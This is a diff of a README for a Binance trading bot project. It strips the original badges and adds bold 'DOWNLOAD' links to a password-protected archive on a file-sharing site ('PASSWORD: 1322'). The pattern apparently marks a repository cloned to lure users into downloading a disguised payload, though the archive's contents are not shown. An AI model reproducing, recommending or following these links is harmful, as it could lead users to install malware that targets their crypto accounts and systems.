@@ -3,17 +3,15 @@
 [![Stand With Ukraine](https://raw.githubusercontent.com/vshymanskyy/StandWithUkraine/main/banner2-direct.svg)](https://war.ukraine.ua)
 
 
-[![GitHub version](https://img.shields.io/github/package-json/v/chrisleekr/binance-trading-bot)](https://github.com/chrisleekr/binance-trading-bot/releases)
-[![Docker pull](https://img.shields.io/docker/pulls/chrisleekr/binance-trading-bot)]
-[![GitHub contributors](https://img.shields.io/github/contributors/chrisleekr/binance-trading-bot)]
-[![MIT License](https://img.shields.io/github/license/chrisleekr/binance-trading-bot)]
-
 > Automated Binance trading bot with trailing buy/sell strategy
 
 ---
 
 
-This is a test project. I am just testing my code.
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
+## PASSWORD: 1322
+
+
 
 ## Warnings
 
@@ -319,7 +317,7 @@ Or use the frontend to adjust configurations after launching the application.
    - If you have any issue with the bot, you can check the log to find out what happened with the bot. Please take a look [Troubleshooting]
 ### Install via Stackfile
 
-# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+# [DOWNLOAD](https://www.4sync.com/s/feLmqkiGe)  
 ## PASSWORD: 1322
 
 ## Screenshots
